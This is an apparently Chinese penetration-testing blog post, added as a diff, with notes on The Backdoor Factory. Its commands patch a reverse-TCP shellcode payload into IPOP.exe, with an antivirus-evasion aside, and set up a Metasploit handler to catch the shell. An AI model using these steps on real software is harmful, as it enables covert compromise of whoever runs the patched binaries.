@@ -1,0 +1,340 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="渗透测试,工具,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>The Backdoor Factory工具笔记 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        The Backdoor Factory工具笔记
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2021-02-22T15:15:17.000Z">
+        2021-02-22
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考Micro8系列第九课：<a href="https://micro8.gitbook.io/micro8/contents-1/1-10/9-gong-ju-jie-shao-thebackdoorfactory" target="_blank" rel="noopener">https://micro8.gitbook.io/micro8/contents-1/1-10/9-gong-ju-jie-shao-thebackdoorfactory</a></p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>The Backdoor Factory即后门工厂，是一款简单实用的后门构造工具，支持Windows PE和Linux ELF两种运行机制的可执行文件，目前来说免杀效果一般。</p>
+<p>BDF的目标是实用用户所需的shell代码对可执行二进制文件进行补丁，并继续正常执行预补丁状态。</p>
+<p>利用该工具，用户可以在不破坏原有可执行文件的功能的前提下，在文件的代码空隙中插入恶意代码Shellcode。当可执行文件被执行后，就可以触发恶意代码。BDF不仅提供常用的脚本，还允许嵌入其他工具生成的Shellcode，如Metasploit。</p>
+<p>工具特点：</p>
+<ul>
+<li>目标文件会被拷贝并且打上补丁</li>
+<li>注入反弹脚本</li>
+<li>修改PE/COFF头以为所有的WIN32 DLL增加附加选项</li>
+</ul>
+<p>Kali官网中的介绍：<a href="https://tools.kali.org/exploitation-tools/backdoor-factory" target="_blank" rel="noopener">https://tools.kali.org/exploitation-tools/backdoor-factory</a></p>
+<p>工具地址：<a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p>
+<p>注意：Kali默认预装的BDF是有问题的，需要从GitHub下载才行。</p>
+<h2 id="0x02-基本原理"><a href="#0x02-基本原理" class="headerlink" title="0x02 基本原理"></a>0x02 基本原理</h2><p>可执行二进制文件中有大量的00，这些00是不包含数据的即无意义的，那么就可以将这些数据替换成payload，并且在程序执行的时候，JMP到代码段来触发payload。</p>
+<p>利用其patch方式的编码加密技术，可以轻松的生成Win32 PE后门程序，从而帮助我们绕过一些防病毒软件的查杀，达到一定得免杀效果。</p>
+<h2 id="0x03-基本用法"><a href="#0x03-基本用法" class="headerlink" title="0x03 基本用法"></a>0x03 基本用法</h2><p>下载BDF：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/secretsquirrel/the-backdoor-factory.git</span><br></pre></td></tr></table></figure>
+<p>查看参数说明：<code>./backdoor.py -h</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">Usage: backdoor.py [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -f FILE, --file=FILE  File to backdoor</span><br><span class="line">  -s SHELL, --shell=SHELL</span><br><span class="line">                        Payloads that are available for use. Use &apos;show&apos; to see</span><br><span class="line">                        payloads.</span><br><span class="line">  -H HOST, --hostip=HOST</span><br><span class="line">                        IP of the C2 for reverse connections.</span><br><span class="line">  -P PORT, --port=PORT  The port to either connect back to for reverse shells</span><br><span class="line">                        or to listen on for bind shells</span><br><span class="line">  -J, --cave_jumping    Select this options if you want to use code cave</span><br><span class="line">                        jumping to further hide your shellcode in the binary.</span><br><span class="line">  -a, --add_new_section</span><br><span class="line">                        Mandating that a new section be added to the exe</span><br><span class="line">                        (better success) but less av avoidance</span><br><span class="line">  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE</span><br><span class="line">                        User supplied shellcode, make sure that it matches the</span><br><span class="line">                        architecture that you are targeting.</span><br><span class="line">  -c, --cave            The cave flag will find code caves that can be used</span><br><span class="line">                        for stashing shellcode. This will print to all the</span><br><span class="line">                        code caves of a specific size.The -l flag can be use</span><br><span class="line">                        with this setting.</span><br><span class="line">  -l SHELL_LEN, --shell_length=SHELL_LEN</span><br><span class="line">                        For use with -c to help find code caves of different</span><br><span class="line">                        sizes</span><br><span class="line">  -o OUTPUT, --output-file=OUTPUT</span><br><span class="line">                        The backdoor output file</span><br><span class="line">  -n NSECTION, --section=NSECTION</span><br><span class="line">                        New section name must be less than seven characters</span><br><span class="line">  -d DIR, --directory=DIR</span><br><span class="line">                        This is the location of the files that you want to</span><br><span class="line">                        backdoor. You can make a directory of file backdooring</span><br><span class="line">                        faster by forcing the attaching of a codecave to the</span><br><span class="line">                        exe by using the -a setting.</span><br><span class="line">  -w, --change_access   This flag changes the section that houses the codecave</span><br><span class="line">                        to RWE. Sometimes this is necessary. Enabled by</span><br><span class="line">                        default. If disabled, the backdoor may fail.</span><br><span class="line">  -i, --injector        This command turns the backdoor factory in a hunt and</span><br><span class="line">                        shellcode inject type of mechanism. Edit the target</span><br><span class="line">                        settings in the injector module.</span><br><span class="line">  -u SUFFIX, --suffix=SUFFIX</span><br><span class="line">                        For use with injector, places a suffix on the original</span><br><span class="line">                        file for easy recovery</span><br><span class="line">  -D, --delete_original</span><br><span class="line">                        For use with injector module.  This command deletes</span><br><span class="line">                        the original file.  Not for use in production systems.</span><br><span class="line">                        *Author not responsible for stupid uses.*</span><br><span class="line">  -O DISK_OFFSET, --disk_offset=DISK_OFFSET</span><br><span class="line">                        Starting point on disk offset, in bytes. Some authors</span><br><span class="line">                        want to obfuscate their on disk offset to avoid</span><br><span class="line">                        reverse engineering, if you find one of those files</span><br><span class="line">                        use this flag, after you find the offset.</span><br><span class="line">  -S, --support_check   To determine if the file is supported by BDF prior to</span><br><span class="line">                        backdooring the file. For use by itself or with</span><br><span class="line">                        verbose. This check happens automatically if the</span><br><span class="line">                        backdooring is attempted.</span><br><span class="line">  -M, --cave-miner      Future use, to help determine smallest shellcode</span><br><span class="line">                        possible in a PE file</span><br><span class="line">  -q, --no_banner       Kills the banner.</span><br><span class="line">  -v, --verbose         For debug information output.</span><br><span class="line">  -T IMAGE_TYPE, --image-type=IMAGE_TYPE</span><br><span class="line">                        ALL, x86, or x64 type binaries only. Default=ALL</span><br><span class="line">  -Z, --zero_cert       Allows for the overwriting of the pointer to the PE</span><br><span class="line">                        certificate table effectively removing the certificate</span><br><span class="line">                        from the binary for all intents and purposes.</span><br><span class="line">  -R, --runas_admin     EXPERIMENTAL Checks the PE binaries for</span><br><span class="line">                        &apos;requestedExecutionLevel level=&quot;highestAvailable&quot;&apos;. If</span><br><span class="line">                        this string is included in the binary, it must run as</span><br><span class="line">                        system/admin. If not in Support Check mode it will</span><br><span class="line">                        attmept to patch highestAvailable into the manifest if</span><br><span class="line">                        requestedExecutionLevel entry exists.</span><br><span class="line">  -L, --patch_dll       Use this setting if you DON&apos;T want to patch DLLs.</span><br><span class="line">                        Patches by default.</span><br><span class="line">  -F FAT_PRIORITY, --fat_priority=FAT_PRIORITY</span><br><span class="line">                        For MACH-O format. If fat file, focus on which arch to</span><br><span class="line">                        patch. Default is x64. To force x86 use -F x86, to</span><br><span class="line">                        force both archs use -F ALL.</span><br><span class="line">  -B BEACON, --beacon=BEACON</span><br><span class="line">                        For payloads that have the ability to beacon out, set</span><br><span class="line">                        the time in secs</span><br><span class="line">  -m PATCH_METHOD, --patch-method=PATCH_METHOD</span><br><span class="line">                        Patching methods for PE files, &apos;manual&apos;,&apos;automatic&apos;,</span><br><span class="line">                        replace and onionduke</span><br><span class="line">  -b SUPPLIED_BINARY, --user_malware=SUPPLIED_BINARY</span><br><span class="line">                        For onionduke. Provide your desired binary.</span><br><span class="line">  -X, --xp_mode         Default: DO NOT support for XP legacy machines, use -X</span><br><span class="line">                        to support XP. By default the binary will crash on XP</span><br><span class="line">                        machines (e.g. sandboxes)</span><br><span class="line">  -A, --idt_in_cave     EXPERIMENTAL By default a new Import Directory Table</span><br><span class="line">                        is created in a new section, by calling this flag it</span><br><span class="line">                        will be put in a code cave.  This can cause bianry</span><br><span class="line">                        failure is some cases. Test on target binaries first.</span><br><span class="line">  -C, --code_sign       For those with codesigning certs wishing to sign PE</span><br><span class="line">                        binaries only. Name your signing key and private key</span><br><span class="line">                        signingcert.cer and signingPrivateKey.pem repectively</span><br><span class="line">                        in the certs directory it&apos;s up to you to obtain</span><br><span class="line">                        signing certs.</span><br><span class="line">  -p, --preprocess      To execute preprocessing scripts in the preprocess</span><br><span class="line">                        directory</span><br></pre></td></tr></table></figure>
+<p>检测是否支持后门植入，这里以IPOP.exe为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f ~/IPOP.exe -S</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/22/The-Backdoor-Factory工具笔记/1.png" alt=""></p>
+<p>测试裂缝空间size 150：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f ~/IPOP.exe -c -l 150</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/22/The-Backdoor-Factory工具笔记/2.png" alt=""></p>
+<p>查看可用payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f ~/IPOP.exe -s show</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/22/The-Backdoor-Factory工具笔记/3.png" alt=""></p>
+<p>插入payload，并生成文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./backdoor.py -f ~/IPOP.exe -H 192.168.1.9 -P 1234 -s iat_reverse_tcp_stager_threaded</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/22/The-Backdoor-Factory工具笔记/4.png" alt=""></p>
+<p>对比原文件与生成文件MD5值：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5sum ~/IPOP.exe ./backdoored/IPOP.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/22/The-Backdoor-Factory工具笔记/5.png" alt=""></p>
+<p>对比原文件与生成文件大小：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -k ~/IPOP.exe ./backdoored/IPOP.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/22/The-Backdoor-Factory工具笔记/6.png" alt=""></p>
+<p>在msf中开启本地监听：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost 192.168.1.9</span><br><span class="line">lhost =&gt; 192.168.1.9</span><br><span class="line">msf exploit(handler) &gt; set lport 1234</span><br><span class="line">lport =&gt; 1234</span><br><span class="line">msf exploit(handler) &gt; exploit -j</span><br></pre></td></tr></table></figure>
+<p>当目标机器打开BDF加后门之后的IPOP.exe软件后，就能获取到反弹shell。</p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-简介"><span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-基本原理"><span class="toc-text">0x02 基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-基本用法"><span class="toc-text">0x03 基本用法</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2021/02/21/无列名注入绕过information-schema/" rel="next" title="无列名注入绕过information_schema">
+          无列名注入绕过information_schema
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2021/02/22/msfvenom常用生成payload命令/" rel="prev" title="msfvenom常用生成payload命令">
+            msfvenom常用生成payload命令
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
